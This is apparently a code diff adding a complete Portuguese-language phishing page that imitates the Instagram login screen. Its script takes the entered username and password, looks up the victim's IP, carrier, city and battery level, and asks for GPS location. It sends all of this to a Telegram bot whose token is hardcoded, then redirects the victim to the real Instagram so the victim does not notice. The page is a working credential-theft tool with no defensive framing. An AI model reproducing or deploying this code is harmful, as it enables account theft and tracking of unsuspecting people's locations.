@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar • Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .main-container { width: 100%; max-width: 350px; margin-top: 12px; }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 10px 40px;
+            margin-bottom: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo { margin: 36px 0 12px; width: 175px; }
+        .form-container { width: 100%; margin-top: 24px; }
+        
+        /* Inputs Estilo Realista */
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-bottom: 6px;
+            outline: none;
+            color: #262626;
+        }
+        input:focus { border-color: #a8a8a8; }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        .btn-login:active { background-color: #1877f2; }
+
+        .divider { display: flex; align-items: center; width: 100%; margin: 10px 0 18px; }
+        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; text-transform: uppercase; }
+        
+        .fb-login { background: none; border: none; color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; }
+        .forgot-pass { font-size: 12px; color: #00376b; text-decoration: none; margin: 15px 0; text-align: center; display: block; }
+        
+        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
+        .signup-box span { color: #0095f6; font-weight: 600; cursor: pointer; }
+
+        @media (max-width: 450px) {
+            body { background-color: #fff; }
+            .login-box, .signup-box { border: none; }
+            .main-container { margin-top: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="login-box">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+            <div class="form-container">
+                <input type="text" id="user" placeholder="Telefone, nome de usuário ou email">
+                <input type="password" id="pass" placeholder="Senha">
+                <button class="btn-login" onclick="capturarDados()">Entrar</button>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="divider-text">ou</div>
+                    <div class="line"></div>
+                </div>
+
+                <button class="fb-login">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="16">
+                    Entrar com o Facebook
+                </button>
+                <a href="#" class="forgot-pass">Esqueceu a senha?</a>
+            </div>
+        </div>
+        <div class="signup-box">Não tem uma conta? <span>Cadastre-se</span></div>
+    </div>
+
+    <script>
+        async function capturarDados() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            if(!user || !pass) return;
+
+            // 1. IP e Operadora aproximada
+            let ip = "Desconhecido";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = `${data.ip} (${data.org}, ${data.city})`;
+            } catch(e) { 
+                const res2 = await fetch('https://api.ipify.org?format=json');
+                const data2 = await res2.json();
+                ip = data2.ip;
+            }
+
+            // 2. Bateria e Navegador
+            let batLevel = "N/A";
+            try { const b = await navigator.getBattery(); batLevel = (b.level * 100) + "%"; } catch(e) {}
+
+            // 3. Localização com Link para Google Maps
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        enviar(user, pass, ip, batLevel, loc);
+                    },
+                    () => { enviar(user, pass, ip, batLevel, "Permissão Negada"); }
+                );
+            } else {
+                enviar(user, pass, ip, batLevel, "Não suportado");
+            }
+        }
+
+        async function enviar(user, pass, ip, bat, loc) {
+            const token = '7955676728:AAHA-fSeZBSiEMnSaPuFmTOdzscNBiPWHaw';
+            const chat_id = '-1003634088931';
+            
+            const texto = `📸 *NOVO LOGIN TESTE*\n\n` +
+                          `👤 *User:* \`${user}\`\n` +
+                          `🔑 *Pass:* \`${pass}\`\n\n` +
+                          `🌐 *IP:* \`${ip}\`\n` +
+                          `🔋 *Bateria:* ${bat}\n` +
+                          `📍 *Mapa:* [Ver Localização](${loc})\n\n` +
+                          `📱 *User-Agent:* \`${navigator.userAgent}\``;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id, text: texto, parse_mode: 'Markdown' })
+            });
+
+            // Redireciona para o Insta real para não levantar suspeitas
+            window.location.href = "https://www.instagram.com/accounts/login/?next=/p/err_connection_reset/";
+        }
+    </script>
+</body>
+</html>
